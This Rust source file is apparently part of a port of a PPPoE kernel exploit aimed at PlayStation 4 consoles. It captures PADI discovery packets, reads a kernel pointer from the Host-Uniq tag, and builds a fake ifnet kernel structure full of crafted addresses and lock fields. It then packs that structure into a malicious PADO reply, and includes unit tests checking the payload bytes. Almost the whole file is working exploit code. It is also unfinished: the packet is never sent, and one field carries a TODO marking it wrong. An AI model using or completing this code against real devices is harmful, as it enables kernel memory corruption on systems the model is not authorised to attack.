use std::process::exit;

use crate::constants;
use crate::macaddress::MacAddress64; // Import the type from macaddress.rs
use pcap::{Activated, Active, Capture, Inactive, State};
use pcap::{Offline, Packet};
pub struct Exploit {
    pub target_mac: MacAddress64,
    pub pppoe_softc: u64,
    pub source_mac: MacAddress64,
    pub host_uniq: [u8; 8],
}

impl Exploit {
    pub fn calc_planted(&mut self) {
        let planted = (self.pppoe_softc + 0x07) & 0xffffffffffff;
        let planted_bytes = planted.to_be_bytes();
        self.source_mac = MacAddress64(planted_bytes);
        println!("[+] Source MAC: {:?}", self.source_mac);
    }
    pub fn ppp_negotiation<T: Activated>(&mut self, mut cap_device: Capture<T>) {
        println!("[*] Starting PPP Negotiation...");
        cap_device.filter("pppoed", false).unwrap();
        println!("[*] Waiting for PADI...");
        while let Ok(packet) = cap_device.next_packet() {
            println!("[*] Scaanning incoming Packet...");
            if !is_padi_packet(&packet) {
                println!("[*] Skipping non PADI...");
                continue;
            }
            self.handle_padi(&packet);
            println!("[*] Sending PADO...");
            let fake_ifnet = build_fake_ifnet(self.pppoe_softc);
            let pado_packet = create_pado_packet(
                self.source_mac.to_mac_address6(),
                self.target_mac.to_mac_address6(),
                fake_ifnet,
                self.pppoe_softc.to_be_bytes(),
            );
            println!("[*] Created PADO Packet. Sending it...");
            return;
        }
        println!("[*] Didn't find any PADI...");
    }

    pub fn handle_padi(&mut self, packet: &Packet) {
        println!("[+] PADI packet received");
        // Extracting Host Unique Tag and populating the self.pppoe_softc
        self.host_uniq = extract_host_uniq(&packet).unwrap();
        self.pppoe_softc = u64::from_be_bytes(self.host_uniq);
        // Extract and update source mac
        self.target_mac = extract_ps4_source_mac(&packet).unwrap();
        println!("[+] Exploit Target MAC: {}", self.target_mac);
        self.calc_planted();
        let ac_cookie = build_fake_ifnet(self.pppoe_softc);
        println!("[+] AC cookie length: {:?}", ac_cookie.len());
    }
}

fn is_padi_packet(packet: &Packet) -> bool {
    let data = packet.data;

    // Check if packet length is sufficient for PPPoE Discovery header
    if data.len() < 14 + 6 {
        return false;
    }

    // Check Ethernet type field for PPPoE Discovery (0x8863)
    let ethertype = u16::from_be_bytes([data[12], data[13]]);
    if ethertype != constants::ETHERTYPE_PPPOEDISC {
        return false;
    }

    // Check PPPoE code field for PADI (0x09)
    let pppoe_code = u8::from_be_bytes([data[15]]);
    pppoe_code == constants::PPPOE_CODE_PADI
}
fn extract_host_uniq(packet: &Packet) -> Result<[u8; 8], Box<dyn std::error::Error>> {
    let data = packet.data;
    let mut result = [0u8; 8];
    // Go to the tags
    let mut offset = constants::ETH_HEADER_LEN + constants::PPPOE_HEADER_LEN;
    // Read all the tags until possible
    while offset + constants::PPPOE_TAG_HEADER_LEN <= data.len() {
        // Read Header
        let tag_type = u16::from_be_bytes([data[offset], data[offset + 1]]);
        let tag_len = u16::from_be_bytes([data[offset + 2], data[offset + 3]]) as usize;
        offset += constants::PPPOE_TAG_HEADER_LEN;

        if tag_type == constants::PPPOE_TAG_HOST_UNIQ {
            if offset + tag_len <= data.len() {
                // Extract the Host-Uniq tag value
                let host_uniq = &data[offset..offset + tag_len];
                if tag_len == 8 {
                    // If Host-Uniq is expected to be a 64-bit integer, interpret it as Big-Endian
                    result.copy_from_slice(host_uniq);
                    println!("[+] Extracted Host-Uniq: {:?}", result);
                    break;
                }
            }
        }
        // Go to next tag
        offset += tag_len;
    }
    Ok(result)
}
fn extract_ps4_source_mac(packet: &Packet) -> Result<MacAddress64, Box<dyn std::error::Error>> {
    // Extract the source MAC address
    let offset = constants::ETH_SOURCE_MAC;
    let mac_bytes = &packet.data[offset..offset + 6];
    // Convert the byte array to MacAddress64
    // Create a MacAddress64 with the extracted bytes
    let mut mac_address = [0u8; 8];
    mac_address[..6].copy_from_slice(mac_bytes);

    Ok(MacAddress64(mac_address))
}
pub fn build_fake_ifnet(pppoe_softc: u64) -> Vec<u8> {
    // Fake ifnet
    let mut fake_ifnet = vec![0x41; 0x48]; // Fill with 'A' initially
    fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // if_addrhead
    fake_ifnet.resize(0x70, 0x41); // Fill to 0x70 with 'A'
    fake_ifnet.extend(&0x0001u16.to_le_bytes()); // if_index
    fake_ifnet.resize(0xa0, 0x41); // Fill to 0xa0 with 'A'
    fake_ifnet.push(constants::IFT_ETHER); // ifi_type
    fake_ifnet.push(0); // ifi_physical
    fake_ifnet.push(0x8 + 0x1); // ifi_addrlen
    fake_ifnet.resize(0x1b8, 0x41); // Fill to 0x1b8 with 'A'

    fake_ifnet.extend(&(pppoe_softc + constants::PPPOE_SOFTC_SC_DEST).to_le_bytes()); // if_addr
    fake_ifnet.resize(0x428, 0x41); // Fill to 0x428 with 'A'
    fake_ifnet.extend(&(pppoe_softc + 0x10 - 0x8).to_le_bytes()); // nd_ifinfo
                                                                  // if_afdata_lock

    fake_ifnet.resize(0x480, 0x41); // Fill to 0x480 with 'A'
                                    // TODO WRONG should not be all 00
    fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // lo_name
    fake_ifnet.extend(&constants::RW_INIT_FLAGS.to_le_bytes()); // lo_flags
    fake_ifnet.extend(&0u32.to_le_bytes()); // lo_data
    fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // lo_witness
    fake_ifnet.extend(&constants::RW_UNLOCKED.to_le_bytes()); // rw_lock
                                                              // if_addr_mtx

    fake_ifnet.resize(0x4c0, 0x41); // Fill to 0x4c0 with 'A'

    fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // lo_name
    fake_ifnet.extend(&constants::MTX_INIT_FLAGS.to_le_bytes()); // lo_flags
    fake_ifnet.extend(&0u32.to_le_bytes()); // lo_data
    fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // lo_witness
    fake_ifnet.extend(&constants::MTX_UNOWNED.to_le_bytes()); // mtx_lock
    fake_ifnet
}
pub fn create_pado_packet(
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    ac_cookie: Vec<u8>,
    host_uniq: [u8; 8],
) -> Vec<u8> {
    let mut packet = Vec::new();

    // Ethernet header
    packet.extend_from_slice(&target_mac);
    packet.extend_from_slice(&source_mac);
    packet.extend_from_slice(&constants::ETHERTYPE_PPPOEDISC.to_be_bytes());

    // PPPoE header
    packet.push(0x11); // Version (1) and Type (1)
    packet.push(constants::PPPOE_CODE_PADO); // Code (PADO)
    packet.extend_from_slice(&0u16.to_be_bytes()); // Session ID (not used in PADO)

    // Placeholder for Payload Length (2 bytes), will be set later
    let payload_length_pos = packet.len();
    packet.extend_from_slice(&[0, 0]);

    // PPPoE Tag for ACOOKIE
    packet.extend_from_slice(&constants::PPPOE_SOFTC_SC_AC_COOKIE.to_be_bytes());
    packet.extend_from_slice(&(ac_cookie.len() as u16).to_be_bytes());
    packet.extend_from_slice(&ac_cookie);

    // PPPoE Tag for HUNIQUE
    packet.extend_from_slice(&constants::PPPOE_TAG_HOST_UNIQ.to_be_bytes());
    packet.extend_from_slice(&(host_uniq.len() as u16).to_be_bytes());
    packet.extend_from_slice(&host_uniq);

    // Set the Payload Length
    let payload_length = packet.len() - payload_length_pos - 2;
    packet[payload_length_pos..payload_length_pos + 2]
        .copy_from_slice(&(payload_length as u16).to_be_bytes());

    packet
}

#[cfg(test)]
mod tests {
    use super::*;
    use pcap::Capture;

    #[test]
    fn test_is_padi_packet_from_file() {
        // Open the pcap file
        let mut cap = Capture::from_file("padi_ps4.pcap").expect("Failed to open pcap file");

        let mut found_padi = false;
        while let Ok(packet) = cap.next_packet() {
            if is_padi_packet(&packet) {
                found_padi = true;
                println!("Found a PADI packet: {:?}", packet);
            }
        }

        // Assert that at least one PADI packet was found
        assert!(
            found_padi,
            "No PADI packets found in the provided pcap file"
        );
    }

    #[test]
    fn test_extract_host_uniq() {
        // Open the pcap file
        let mut cap = Capture::from_file("padi_ps4.pcap").expect("Failed to open pcap file");

        while let Ok(packet) = cap.next_packet() {
            if is_padi_packet(&packet) {
                match extract_host_uniq(&packet) {
                    Ok(host_uniq) => {
                        println!("Extracted Host-Uniq: {:?}", host_uniq);
                        // Assert that the Host-Uniq value has the expected length
                        assert_eq!(host_uniq.len(), 8);
                    }
                    Err(e) => {
                        panic!("Failed to extract Host-Uniq: {:?}", e);
                    }
                }
            }
        }
    }

    #[test]
    fn test_extract_source_mac() {
        // Open the pcap file
        let mut cap = Capture::from_file("padi_ps4.pcap").expect("Failed to open pcap file");

        while let Ok(packet) = cap.next_packet() {
            if is_padi_packet(&packet) {
                match extract_ps4_source_mac(&packet) {
                    Ok(source_mac) => {
                        println!("Extracted Source MAC Address: {:?}", source_mac);
                        // Assert that the MAC address has the expected length
                        assert_eq!(source_mac.0.len(), 8);
                        // Optionally, check the MAC address values
                        assert_eq!(&source_mac.0[..6], &[0xc8, 0x63, 0xf1, 0x44, 0x45, 0x97]);
                    }
                    Err(e) => {
                        panic!("Failed to extract Source MAC Address: {:?}", e);
                    }
                }
            }
        }
    }

    use std::fs::File;
    use std::io::Read;
    use std::io::Write;
    #[test]
    fn test_fake_ifnet_comparison() {
        // Generate fake ifnet using the Rust implementation
        let pppoe_softc: u64 = 0x123456789ABCDEF0;
        let rust_fake_ifnet = build_fake_ifnet(pppoe_softc);

        // Dump the fake ifnet to a file
        let mut rust_file = File::create("rust_fake_ifnet.bin").expect("Failed to create file");
        rust_file
            .write_all(&rust_fake_ifnet)
            .expect("Failed to write to file");

        // Load the fake ifnet generated by Python
        let mut python_fake_ifnet = Vec::new();
        let mut python_file =
            File::open("fake_ifnet.bin").expect("Failed to open Python fake ifnet file");
        python_file
            .read_to_end(&mut python_fake_ifnet)
            .expect("Failed to read Python fake ifnet file");

        // Compare the lengths of the two files
        assert_eq!(
            rust_fake_ifnet.len(),
            python_fake_ifnet.len(),
            "File lengths are not equal"
        );

        // Compare the contents of the two files byte by byte
        for (idx, (rust_byte, python_byte)) in rust_fake_ifnet
            .iter()
            .zip(python_fake_ifnet.iter())
            .enumerate()
        {
            assert_eq!(rust_byte, python_byte, "Byte mismatch at index {}", idx);
        }
    }

    #[test]
    fn test_ppp_negotiation() {
        // Open the pcap file
        let cap = Capture::from_file("padi_ps4.pcap").expect("Failed to open pcap file");
        // Cap device
        let interface = "en10";
        // Open the specified interface

        let mut exploit = Exploit {
            target_mac: MacAddress64::from_u64(0),
            pppoe_softc: 0,
            source_mac: MacAddress64([41, 41, 41, 41, 41, 41, 41, 41]),
            host_uniq: [0, 0, 0, 0, 0, 0, 0, 0],
        };

        exploit.ppp_negotiation(cap);

        // Assertions to verify the PPP negotiation process
        // Ensure the `target_mac` has been updated correctly
        assert_eq!(
            exploit.target_mac,
            MacAddress64([0xc8, 0x63, 0xf1, 0x44, 0x45, 0x97, 0, 0]),
            "The target MAC address was not updated correctly"
        );

        // Ensure the `pppoe_softc` has been set from the extracted Host-Uniq tag
        assert_eq!(
            exploit.pppoe_softc,
            0x123456789ABCDEF0, // Replace with the actual expected value from the pcap file
            "The PPPoE softc value was not set correctly"
        );

        // Ensure the `source_mac` has been updated after calculating the planted value
        let expected_planted_bytes = (exploit.pppoe_softc + 0x07 & 0xffffffffffff).to_be_bytes();
        assert_eq!(
            exploit.source_mac,
            MacAddress64(expected_planted_bytes),
            "The source MAC address was not updated correctly after calculating the planted value"
        );

        // Ensure the `host_uniq` has been set correctly from the PADI packet
        let expected_host_uniq: [u8; 8] = [0xc8, 0x63, 0xf1, 0x44, 0x45, 0x97, 0, 0];
        assert_eq!(
            exploit.host_uniq, expected_host_uniq,
            "The Host-Uniq tag value was not set correctly"
        );
    }
}
